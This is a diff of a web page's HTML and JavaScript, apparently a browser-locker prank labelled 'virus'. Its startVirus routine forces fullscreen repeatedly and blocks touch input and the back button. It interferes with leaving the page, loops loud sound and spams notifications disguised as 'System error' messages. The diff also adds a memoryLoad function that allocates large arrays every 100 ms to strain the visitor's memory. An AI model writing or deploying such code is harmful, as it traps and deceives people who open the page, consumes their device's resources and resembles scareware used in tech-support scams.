@@ -53,23 +53,6 @@
             -moz-user-select: none;
             -ms-user-select: none;
         }
-
-        .noise {
-            position: fixed;
-            width: 100px;
-            height: 100px;
-            background-color: rgba(255, 0, 0, 0.8);
-            z-index: 3;
-            animation: move 1s infinite;
-        }
-
-        @keyframes move {
-            0% { transform: translate(0, 0); }
-            25% { transform: translate(50vw, 50vh); }
-            50% { transform: translate(-50vw, -50vh); }
-            75% { transform: translate(20vw, -20vh); }
-            100% { transform: translate(0, 0); }
-        }
     </style>
 </head>
 <body>
@@ -82,10 +65,8 @@
         const sound = document.getElementById('sound');
         let hasClicked = false;
 
-        // Проверка, является ли устройство ПК
         const isPC = !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
-        // Устанавливаем onbeforeunload для ПК сразу
         if (isPC) {
             window.onbeforeunload = function() {
                 if (hasClicked) {
@@ -94,7 +75,6 @@
             };
         }
 
-        // Загружаем изображение
         const img1 = new Image();
         img1.src = 'image1.jpg';
 
@@ -104,7 +84,6 @@
             ctx.drawImage(img1, 0, 0, canvas.width, canvas.height);
         };
         img1.onerror = () => {
-            // Если изображение не загрузилось, всё равно продолжаем
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
             ctx.fillStyle = "#000";
@@ -121,33 +100,24 @@
         }
 
         function startVirus() {
-            hasClicked = true; // Устанавливаем сразу
+            hasClicked = true;
             const overlay = document.getElementById('overlay');
             overlay.classList.add('hidden');
 
-            // Запуск звука
             sound.volume = 1.0;
             sound.loop = true;
-            sound.play().catch(() => {
-                // Если звук не загрузился, продолжаем
-            });
+            sound.play().catch(() => {});
             sound.onpause = () => sound.play();
 
-            // Полноэкранный режим
             enterFullscreen();
-
-            // Усложняем выход
             trapUser();
-
-            // Блокируем взаимодействие
             document.body.classList.add('no-interaction');
-
-            // Добавляем хаотичные элементы
-            spawnNoise();
+            
+            // Добавляем нагрузку на память
+            memoryLoad();
         }
 
         function trapUser() {
-            // Блокировка касаний
             document.addEventListener('touchstart', e => {
                 if (hasClicked) e.preventDefault();
             });
@@ -155,43 +125,39 @@
                 if (hasClicked) e.preventDefault();
             });
 
-            // Блокировка кнопки "назад"
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', () => {
                 history.pushState(null, null, location.href);
             });
 
-            // Постоянная проверка fullscreen
             setInterval(() => {
                 if (!document.fullscreenElement && hasClicked) {
                     enterFullscreen();
                 }
             }, 100);
 
-            // Бесконечные уведомления (если разрешены)
             if (Notification.permission === "granted") {
-                setInterval(() => new Notification("Ты не уйдёшь!"), 1000);
+                setInterval(() => new Notification("Ошибка системы"), 1000);
             } else if (Notification.permission !== "denied") {
                 Notification.requestPermission().then(permission => {
                     if (permission === "granted") {
-                        setInterval(() => new Notification("Ты не уйдёшь!"), 1000);
+                        setInterval(() => new Notification("Ошибка системы"), 1000);
                     }
                 });
             }
-
-            // Бесконечные alert для максимального раздражения
-            setInterval(() => alert("Ты застрял!"), 2000);
         }
 
-        function spawnNoise() {
+        function memoryLoad() {
+            let arrays = [];
+            // Создаем массивы для нагрузки памяти
             setInterval(() => {
-                const noise = document.createElement('div');
-                noise.className = 'noise';
-                noise.style.left = Math.random() * 90 + 'vw';
-                noise.style.top = Math.random() * 90 + 'vh';
-                document.body.appendChild(noise);
-                setTimeout(() => noise.remove(), 2000);
-            }, 500);
+                const largeArray = new Array(1000000).fill(Math.random());
+                arrays.push(largeArray);
+                // Ограничиваем количество массивов, чтобы не убить браузер полностью
+                if (arrays.length > 50) {
+                    arrays.shift();
+                }
+            }, 100);
         }
     </script>
 </body>
